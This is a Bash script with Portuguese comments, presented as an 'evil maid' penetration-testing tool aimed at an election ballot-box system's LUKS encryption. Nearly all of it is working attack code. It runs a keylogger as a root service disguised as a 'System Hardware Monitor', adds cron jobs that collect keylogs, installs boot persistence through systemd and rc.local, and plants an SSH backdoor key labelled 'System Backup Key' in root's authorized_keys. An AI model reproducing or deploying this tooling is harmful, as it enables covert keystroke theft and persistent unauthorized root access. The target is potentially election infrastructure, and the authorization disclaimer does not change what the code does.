#!/bin/bash

# Evil Maid Persistence Manager
# TSE 2025 Ballot-Box TPU System LUKS Penetration Testing
# 
# Script para gerenciar persistência e coleta de resultados
# 
# AVISO: SOMENTE PARA TESTES AUTORIZADOS DE PENETRAÇÃO!
# USO NÃO AUTORIZADO É CRIME!

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configurações
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PERSISTENCE_DIR="/var/lib/.evil-maid"
SYSTEMD_DIR="/etc/systemd/system"
CRON_DIR="/etc/cron.d"
LOG_DIR="/var/log/.evil-maid"
KEYLOG_FILE="/tmp/.keylog"
BACKUP_LOG="/var/tmp/.keylog_backup"
RESULTS_DIR="$SCRIPT_DIR/../../results"

# Banner
print_banner() {
    echo -e "${PURPLE}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║              Evil Maid Persistence Manager               ║"
    echo "║          TSE 2025 Ballot-Box LUKS Penetration            ║"
    echo "║                                                           ║"
    echo "║  AVISO: SOMENTE PARA TESTES AUTORIZADOS!                ║"
    echo "║  USO NÃO AUTORIZADO É CRIME!                            ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo
}

# Log com timestamp
log_message() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        "INFO")  echo -e "${GREEN}[INFO]${NC}  [$timestamp] $message" ;;
        "WARN")  echo -e "${YELLOW}[WARN]${NC}  [$timestamp] $message" ;;
        "ERROR") echo -e "${RED}[ERROR]${NC} [$timestamp] $message" ;;
        "DEBUG") echo -e "${BLUE}[DEBUG]${NC} [$timestamp] $message" ;;
        *)       echo -e "${WHITE}[$level]${NC} [$timestamp] $message" ;;
    esac
    
    # Salvar em log file também
    mkdir -p "$LOG_DIR"
    echo "[$level] [$timestamp] $message" >> "$LOG_DIR/persistence.log"
}

# Verificar permissões de root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_message "ERROR" "Este script deve ser executado como root!"
        exit 1
    fi
}

# Criar diretórios necessários
create_directories() {
    log_message "INFO" "Criando estrutura de diretórios..."
    
    mkdir -p "$PERSISTENCE_DIR"
    mkdir -p "$LOG_DIR"
    mkdir -p "$RESULTS_DIR"
    
    # Tornar diretórios ocultos
    chattr +i "$PERSISTENCE_DIR" 2>/dev/null
    chmod 700 "$PERSISTENCE_DIR" "$LOG_DIR"
    
    log_message "INFO" "Diretórios criados com sucesso"
}

# Instalar keylogger como serviço systemd
install_keylogger_service() {
    log_message "INFO" "Instalando keylogger como serviço systemd..."
    
    local keylogger_path="$SCRIPT_DIR/keylogger"
    local service_file="$SYSTEMD_DIR/evil-keylogger.service"
    
    if [[ ! -f "$keylogger_path" ]]; then
        log_message "ERROR" "Keylogger não encontrado em: $keylogger_path"
        return 1
    fi
    
    # Copiar keylogger para local permanente
    cp "$keylogger_path" "$PERSISTENCE_DIR/keylogger"
    chmod +x "$PERSISTENCE_DIR/keylogger"
    
    # Criar serviço systemd
    cat > "$service_file" << 'EOF'
[Unit]
Description=System Hardware Monitor
After=multi-user.target
Wants=network-online.target

[Service]
Type=forking
ExecStart=/var/lib/.evil-maid/keylogger --daemon
Restart=always
RestartSec=10
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    # Habilitar e iniciar serviço
    systemctl daemon-reload
    systemctl enable evil-keylogger.service
    systemctl start evil-keylogger.service
    
    if systemctl is-active --quiet evil-keylogger.service; then
        log_message "INFO" "Keylogger instalado e iniciado como serviço"
    else
        log_message "ERROR" "Falha ao iniciar serviço keylogger"
        return 1
    fi
}

# Instalar cron job para coleta de resultados
install_cron_collector() {
    log_message "INFO" "Instalando cron job para coleta de dados..."
    
    local cron_file="$CRON_DIR/evil-collector"
    
    cat > "$cron_file" << EOF
# Evil Maid Data Collector - executa a cada 5 minutos
*/5 * * * * root $PERSISTENCE_DIR/collect_data.sh >/dev/null 2>&1

# Cleanup logs - executa diariamente às 3:00
0 3 * * * root $PERSISTENCE_DIR/cleanup.sh >/dev/null 2>&1
EOF

    # Criar script de coleta
    create_collector_script
    create_cleanup_script
    
    log_message "INFO" "Cron jobs instalados"
}

# Criar script de coleta de dados
create_collector_script() {
    local collector_script="$PERSISTENCE_DIR/collect_data.sh"
    
    cat > "$collector_script" << 'EOF'
#!/bin/bash

# Script de coleta automática de dados
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
COLLECT_DIR="/var/lib/.evil-maid/collected"
KEYLOG_FILE="/tmp/.keylog"
BACKUP_LOG="/var/tmp/.keylog_backup"

mkdir -p "$COLLECT_DIR"

# Coletar keylogs se existirem
if [[ -f "$KEYLOG_FILE" ]] && [[ -s "$KEYLOG_FILE" ]]; then
    cp "$KEYLOG_FILE" "$COLLECT_DIR/keylog_$TIMESTAMP.txt"
    echo "Keylog coletado: $TIMESTAMP" >> "$COLLECT_DIR/collection.log"
fi

if [[ -f "$BACKUP_LOG" ]] && [[ -s "$BACKUP_LOG" ]]; then
    cp "$BACKUP_LOG" "$COLLECT_DIR/keylog_backup_$TIMESTAMP.txt"
fi

# Coletar informações do sistema
{
    echo "=== COLETA DE DADOS - $TIMESTAMP ==="
    echo "Sistema: $(uname -a)"
    echo "Uptime: $(uptime)"
    echo "Usuários logados: $(who)"
    echo "Processos LUKS/Crypt:"
    ps aux | grep -i "luks\|crypt\|dm-crypt" | grep -v grep
    echo
    echo "Dispositivos montados:"
    mount | grep -E "(luks|crypt|dm-)"
    echo
    echo "Dispositivos de bloco:"
    lsblk -f | grep -E "(luks|crypt|ext4|ntfs)"
    echo
} > "$COLLECT_DIR/system_info_$TIMESTAMP.txt"

# Limitar número de arquivos coletados (manter apenas os 50 mais recentes)
cd "$COLLECT_DIR"
ls -t keylog_*.txt 2>/dev/null | tail -n +51 | xargs rm -f 2>/dev/null
ls -t system_info_*.txt 2>/dev/null | tail -n +51 | xargs rm -f 2>/dev/null
EOF

    chmod +x "$collector_script"
}

# Criar script de limpeza
create_cleanup_script() {
    local cleanup_script="$PERSISTENCE_DIR/cleanup.sh"
    
    cat > "$cleanup_script" << 'EOF'
#!/bin/bash

# Script de limpeza automática
LOG_DIR="/var/log/.evil-maid"
COLLECT_DIR="/var/lib/.evil-maid/collected"
MAX_LOG_SIZE=10485760  # 10MB

# Rotacionar logs grandes
for log_file in "$LOG_DIR"/*.log; do
    if [[ -f "$log_file" ]] && [[ $(stat -f%z "$log_file" 2>/dev/null || stat -c%s "$log_file") -gt $MAX_LOG_SIZE ]]; then
        mv "$log_file" "${log_file}.old"
        touch "$log_file"
    fi
done

# Limpar arquivos antigos (mais de 30 dias)
find "$COLLECT_DIR" -type f -mtime +30 -delete 2>/dev/null
find "$LOG_DIR" -name "*.old" -mtime +7 -delete 2>/dev/null

# Limpar logs temporários do sistema
find /tmp -name ".keylog*" -mtime +1 -delete 2>/dev/null
find /var/tmp -name ".keylog*" -mtime +1 -delete 2>/dev/null
EOF

    chmod +x "$cleanup_script"
}

# Criar script de boot persistence
install_boot_persistence() {
    log_message "INFO" "Instalando persistência no boot..."
    
    local boot_script="$PERSISTENCE_DIR/boot_persistence.sh"
    
    cat > "$boot_script" << 'EOF'
#!/bin/bash

# Script executado no boot para garantir persistência
PERSISTENCE_DIR="/var/lib/.evil-maid"

# Verificar se keylogger está rodando
if ! pgrep -f "keylogger" >/dev/null; then
    systemctl start evil-keylogger.service 2>/dev/null
fi

# Verificar se diretórios existem
mkdir -p "$PERSISTENCE_DIR" /var/log/.evil-maid

# Recriar cron jobs se necessários
if [[ ! -f "/etc/cron.d/evil-collector" ]]; then
    cat > "/etc/cron.d/evil-collector" << 'EOFCRON'
*/5 * * * * root /var/lib/.evil-maid/collect_data.sh >/dev/null 2>&1
0 3 * * * root /var/lib/.evil-maid/cleanup.sh >/dev/null 2>&1
EOFCRON
fi

# Log de boot
echo "$(date): Boot persistence executado" >> "/var/log/.evil-maid/boot.log"
EOF

    chmod +x "$boot_script"
    
    # Adicionar ao rc.local se existir
    if [[ -f "/etc/rc.local" ]]; then
        if ! grep -q "boot_persistence.sh" "/etc/rc.local"; then
            sed -i '/^exit 0/i\\n# Evil Maid Boot Persistence\n/var/lib/.evil-maid/boot_persistence.sh &\n' "/etc/rc.local"
        fi
    fi
    
    # Criar serviço systemd para boot
    local boot_service="$SYSTEMD_DIR/evil-boot-persistence.service"
    
    cat > "$boot_service" << 'EOF'
[Unit]
Description=System Boot Manager
After=multi-user.target

[Service]
Type=oneshot
ExecStart=/var/lib/.evil-maid/boot_persistence.sh
RemainAfterExit=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable evil-boot-persistence.service
    
    log_message "INFO" "Persistência de boot instalada"
}

# Criar backdoor SSH se possível
install_ssh_backdoor() {
    log_message "INFO" "Tentando instalar backdoor SSH..."
    
    if ! command -v ssh &> /dev/null; then
        log_message "WARN" "SSH não encontrado, pulando backdoor SSH"
        return 1
    fi
    
    local ssh_key="$PERSISTENCE_DIR/evil_key"
    local authorized_keys="/root/.ssh/authorized_keys"
    
    # Gerar chave SSH
    if [[ ! -f "$ssh_key" ]]; then
        ssh-keygen -t rsa -b 2048 -f "$ssh_key" -N "" -C "system-backup@localhost" 2>/dev/null
    fi
    
    # Adicionar chave às chaves autorizadas
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    
    if [[ -f "${ssh_key}.pub" ]] && [[ ! $(grep -F "$(cat ${ssh_key}.pub)" "$authorized_keys" 2>/dev/null) ]]; then
        echo "# System Backup Key" >> "$authorized_keys"
        cat "${ssh_key}.pub" >> "$authorized_keys"
        chmod 600 "$authorized_keys"
        log_message "INFO" "Backdoor SSH instalado"
    fi
}

# Coletar resultados existentes
collect_existing_results() {
    log_message "INFO" "Coletando resultados existentes..."
    
    local results_archive="$RESULTS_DIR/evil_maid_results_$(date +%Y%m%d_%H%M%S).tar.gz"
    local temp_collect="/tmp/evil_maid_collect"
    
    mkdir -p "$temp_collect"
    
    # Coletar keylogs
    if [[ -f "$KEYLOG_FILE" ]]; then
        cp "$KEYLOG_FILE" "$temp_collect/current_keylog.txt"
    fi
    
    if [[ -f "$BACKUP_LOG" ]]; then
        cp "$BACKUP_LOG" "$temp_collect/backup_keylog.txt"
    fi
    
    # Coletar logs do sistema
    cp -r "$LOG_DIR"/* "$temp_collect/" 2>/dev/null
    
    # Coletar dados já coletados
    if [[ -d "$PERSISTENCE_DIR/collected" ]]; then
        cp -r "$PERSISTENCE_DIR/collected" "$temp_collect/"
    fi
    
    # Informações do sistema
    {
        echo "=== EVIL MAID COLLECTION REPORT ==="
        echo "Data: $(date)"
        echo "Sistema: $(uname -a)"
        echo "Hostname: $(hostname)"
        echo
        echo "=== DISPOSITIVOS LUKS ==="
        cryptsetup status $(ls /dev/mapper/* 2>/dev/null | grep -E "(luks|crypt)")
        echo
        echo "=== PROCESSOS SUSPEITOS ==="
        ps aux | grep -E "(keylogger|evil|luks|crypt)" | grep -v grep
        echo
        echo "=== SERVIÇOS INSTALADOS ==="
        systemctl list-unit-files | grep evil
        echo
        echo "=== CRON JOBS ==="
        cat /etc/cron.d/evil-* 2>/dev/null
        echo
    } > "$temp_collect/collection_report.txt"
    
    # Criar arquivo compactado
    tar czf "$results_archive" -C /tmp evil_maid_collect
    rm -rf "$temp_collect"
    
    if [[ -f "$results_archive" ]]; then
        log_message "INFO" "Resultados coletados em: $results_archive"
        echo -e "\n${GREEN}Arquivo de resultados criado:${NC}"
        echo -e "${YELLOW}$results_archive${NC}"
        ls -lh "$results_archive"
    fi
}

# Remover persistência (para cleanup)
remove_persistence() {
    log_message "WARN" "Removendo persistência do Evil Maid..."
    
    # Parar serviços
    systemctl stop evil-keylogger.service 2>/dev/null
    systemctl stop evil-boot-persistence.service 2>/dev/null
    
    # Desabilitar serviços
    systemctl disable evil-keylogger.service 2>/dev/null
    systemctl disable evil-boot-persistence.service 2>/dev/null
    
    # Remover arquivos de serviço
    rm -f "$SYSTEMD_DIR/evil-keylogger.service"
    rm -f "$SYSTEMD_DIR/evil-boot-persistence.service"
    
    # Remover cron jobs
    rm -f "$CRON_DIR/evil-collector"
    
    # Remover do rc.local
    if [[ -f "/etc/rc.local" ]]; then
        sed -i '/boot_persistence.sh/d' "/etc/rc.local"
    fi
    
    # Remover chave SSH
    if [[ -f "/root/.ssh/authorized_keys" ]]; then
        sed -i '/system-backup@localhost/d' "/root/.ssh/authorized_keys"
        sed -i '/System Backup Key/d' "/root/.ssh/authorized_keys"
    fi
    
    systemctl daemon-reload
    
    log_message "WARN" "Persistência removida (diretórios preservados para evidência)"
}

# Status da persistência
check_persistence_status() {
    echo -e "\n${CYAN}=== STATUS DA PERSISTÊNCIA EVIL MAID ===${NC}\n"
    
    # Serviços
    echo -e "${YELLOW}Serviços:${NC}"
    if systemctl is-active --quiet evil-keylogger.service; then
        echo -e "  Keylogger: ${GREEN}ATIVO${NC}"
    else
        echo -e "  Keylogger: ${RED}INATIVO${NC}"
    fi
    
    if systemctl is-active --quiet evil-boot-persistence.service; then
        echo -e "  Boot Persistence: ${GREEN}ATIVO${NC}"
    else
        echo -e "  Boot Persistence: ${RED}INATIVO${NC}"
    fi
    
    # Cron jobs
    echo -e "\n${YELLOW}Cron Jobs:${NC}"
    if [[ -f "$CRON_DIR/evil-collector" ]]; then
        echo -e "  Collector: ${GREEN}INSTALADO${NC}"
    else
        echo -e "  Collector: ${RED}NÃO INSTALADO${NC}"
    fi
    
    # Arquivos
    echo -e "\n${YELLOW}Arquivos:${NC}"
    echo "  Diretório persistência: $([[ -d "$PERSISTENCE_DIR" ]] && echo -e "${GREEN}EXISTE${NC}" || echo -e "${RED}NÃO EXISTE${NC}")"
    echo "  Keylogger: $([[ -f "$PERSISTENCE_DIR/keylogger" ]] && echo -e "${GREEN}EXISTE${NC}" || echo -e "${RED}NÃO EXISTE${NC}")"
    echo "  Logs: $([[ -d "$LOG_DIR" ]] && echo -e "${GREEN}EXISTE${NC}" || echo -e "${RED}NÃO EXISTE${NC}")"
    
    # Processos
    echo -e "\n${YELLOW}Processos ativos:${NC}"
    pgrep -l "keylogger" || echo "  Nenhum keylogger em execução"
    
    # Tamanho dos logs
    if [[ -f "$KEYLOG_FILE" ]]; then
        local size=$(stat -c%s "$KEYLOG_FILE" 2>/dev/null || echo "0")
        echo -e "\n${YELLOW}Keylog atual:${NC} $size bytes"
    fi
    
    echo
}

# Menu principal
show_menu() {
    echo -e "${CYAN}Escolha uma opção:${NC}"
    echo "1) Instalar persistência completa"
    echo "2) Instalar apenas keylogger"
    echo "3) Coletar resultados"
    echo "4) Verificar status"
    echo "5) Remover persistência"
    echo "6) Sair"
    echo
    read -p "Opção [1-6]: " choice
    
    case $choice in
        1) install_full_persistence ;;
        2) install_keylogger_service ;;
        3) collect_existing_results ;;
        4) check_persistence_status ;;
        5) remove_persistence ;;
        6) log_message "INFO" "Saindo..."; exit 0 ;;
        *) log_message "ERROR" "Opção inválida!" ;;
    esac
}

# Instalação completa
install_full_persistence() {
    log_message "INFO" "Iniciando instalação completa da persistência..."
    
    create_directories
    install_keylogger_service
    install_cron_collector
    install_boot_persistence
    install_ssh_backdoor
    
    log_message "INFO" "Instalação completa finalizada!"
    check_persistence_status
}

# Função principal
main() {
    print_banner
    check_root
    
    if [[ $# -eq 0 ]]; then
        # Modo interativo
        while true; do
            show_menu
            echo
        done
    else
        # Modo linha de comando
        case "$1" in
            "install") install_full_persistence ;;
            "keylogger") install_keylogger_service ;;
            "collect") collect_existing_results ;;
            "status") check_persistence_status ;;
            "remove") remove_persistence ;;
            *)
                echo "Uso: $0 [install|keylogger|collect|status|remove]"
                exit 1
                ;;
        esac
    fi
}

# Executar função principal
main "$@"